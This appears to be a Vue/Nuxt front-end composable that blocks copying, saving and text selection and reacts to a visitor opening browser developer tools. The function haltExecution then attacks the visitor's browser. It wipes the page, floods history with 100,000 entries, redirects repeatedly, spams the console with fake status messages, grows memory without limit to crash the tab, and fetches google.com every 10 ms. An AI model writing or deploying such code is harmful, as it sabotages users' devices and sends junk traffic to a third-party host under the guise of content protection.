import { onMounted } from 'vue';

export default function useBlockDevTools() {
  onMounted(async () => {
    if (process.client && typeof window !== 'undefined') {
      // Disable text selection and copying
      document.addEventListener('selectstart', (e) => {
        e.preventDefault();
        return false;
      }, true);

      document.addEventListener('copy', (e) => {
        e.preventDefault();
        e.clipboardData?.clearData();
        return false;
      }, true);

      document.addEventListener('cut', (e) => {
        e.preventDefault();
        e.clipboardData?.clearData();
        return false;
      }, true);

      // Block Ctrl+C, Cmd+C, Ctrl+X, Cmd+X, Ctrl+S, Cmd+S
      document.addEventListener('keydown', (e) => {
        // Block copy
        if ((e.ctrlKey || e.metaKey) && (e.key === 'c' || e.key === 'C')) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          return false;
        }
        // Block cut
        if ((e.ctrlKey || e.metaKey) && (e.key === 'x' || e.key === 'X')) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          return false;
        }
        // Block save page
        if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'S')) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          return false;
        }
      }, true);

      // Disable drag selection
      document.addEventListener('dragstart', (e) => {
        e.preventDefault();
        return false;
      }, true);

      try {
        const devtoolModule = await import('disable-devtool');
        const devtoolBlocker = devtoolModule.default;

        // Ensure meaningful condition remains unchanged
        devtoolBlocker({
          ondevtoolopen: () => {
            console.warn('DevTools activated!'); // Replace with haltExecution() or equivalent logic
            haltExecution();
          },
        });
      } catch (err) {
        console.error('Could not block developer tools:', err);
      }
    }
  });
}

function haltExecution() {
  // Clear the page completely first
  document.body.innerHTML = '';
  
  // Remove all stylesheets and scripts
  const head = document.head;
  if (head) {
    const styles = head.querySelectorAll('style, link[rel="stylesheet"]');
    styles.forEach(s => s.remove());
  }
  
  let alertMessage = `Unauthorized access to developer tools detected.`;

  // Create and style the overlay div for the alert
  var overlay = document.createElement("div");
  overlay.innerText = alertMessage;
  overlay.style.cssText = `
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
    background-color: #000000 !important;
    color: #ffffff !important;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
    font-size: 25px !important;
    z-index: 2147483647 !important;
    cursor: pointer !important;
    font-family: Arial, sans-serif !important;
    margin: 0 !important;
    padding: 0 !important;
  `;

  // Redirect to google.com when clicked
  overlay.addEventListener('click', function () {
    window.location.href = "https://google.com";
  });

  // Set body styles to ensure overlay is visible
  document.body.style.cssText = `
    margin: 0 !important;
    padding: 0 !important;
    overflow: hidden !important;
    width: 100vw !important;
    height: 100vh !important;
  `;

  // Append the overlay to the body
  document.body.appendChild(overlay);
  
  // Force a reflow to ensure the overlay is rendered
  overlay.offsetHeight;

  // Flood browser history
  var urlFragment = "";
  for (var i = 0; i < 100000; i++) {
    urlFragment = urlFragment + i.toString();
    history.pushState(0, '0', urlFragment);
  }

  // Set multiple intervals for redirects and memory load
  setInterval(function () {
    window.location.href = "https://google.com";
  }, 100);

  // Random console messages with varied timing
  const messages = [
    "System check...",
    "Processing request...",
    "Loading resources...",
    "Initializing...",
    "Checking configuration...",
    "Validating session...",
    "Updating cache...",
    "Connecting to server...",
    "Fetching data...",
    "Analyzing response...",
    "Debug mode active",
    "Running diagnostics...",
    "Monitoring performance...",
    "Optimizing...",
    "Synchronizing..."
  ];

  const logRandomMessage = () => {
    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
    const randomNum = Math.floor(Math.random() * 10000);
    const randomTime = new Date().toISOString();
    
    // Randomly choose different console methods
    const methodIndex = Math.floor(Math.random() * 4);
    const logMessage = `[${randomTime}] ${randomMsg} (${randomNum})`;
    
    switch(methodIndex) {
      case 0:
        console.log(logMessage);
        break;
      case 1:
        console.info(logMessage);
        break;
      case 2:
        console.warn(logMessage);
        break;
      case 3:
        console.debug(logMessage);
        break;
    }
  };

  // Log at random intervals between 50ms and 300ms
  const scheduleRandomLog = () => {
    const delay = Math.floor(Math.random() * 250) + 50; // 50-300ms
    setTimeout(() => {
      logRandomMessage();
      scheduleRandomLog(); // Schedule next log
    }, delay);
  };
  
  scheduleRandomLog();

  let memoryHog = [];
  setInterval(() => {
    memoryHog.push(new Array(1000000).fill('B'));
  }, 3);

  fetch("https://google.com");
  setInterval(function () {
    fetch("https://google.com");
  }, 10);

  const computation = (input: boolean) => {
    let result = Math.min(Infinity ? ([] as any) : Infinity, -0) / 0;
    if (input) result = -0;
    return result ? 1 : 0;
  };

  computation(false);
  for (let i = 0; i < 0x10000; ++i) computation(false);
  computation(false);
}
